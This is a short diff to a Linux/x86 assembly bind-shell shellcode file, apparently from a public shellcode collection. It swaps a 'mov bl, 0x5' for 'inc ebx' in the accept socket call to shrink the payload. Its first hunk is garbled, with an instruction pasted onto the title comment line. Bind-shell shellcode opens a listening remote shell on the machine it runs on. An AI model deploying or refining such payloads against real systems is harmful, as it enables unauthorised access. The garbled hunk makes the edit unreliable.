@@ -1,4 +1,4 @@
-; Title: Linux/x86 Bind Shell code - 90bit
+inc ebx			; accept(5); Title: Linux/x86 Bind Shell code - 90bit
 ; Author: Zsolt Agoston (agzsolt)
 
 global _start
@@ -68,7 +68,7 @@ int 0x80
 ; eax=0x66, ebx=5, ecx=args in stack (sockfd, NULL, NULL)
 
 mov al, 0x66		  ; sys socket call
-mov bl, 0x5		    ; accept(5)
+inc ebx			      ; accept(5)
 push edx		      ; null value socklen_t *addrlen
 push edx		      ; null value sockaddr *addr
 push esi		      ; sockfd (sock_file_des )
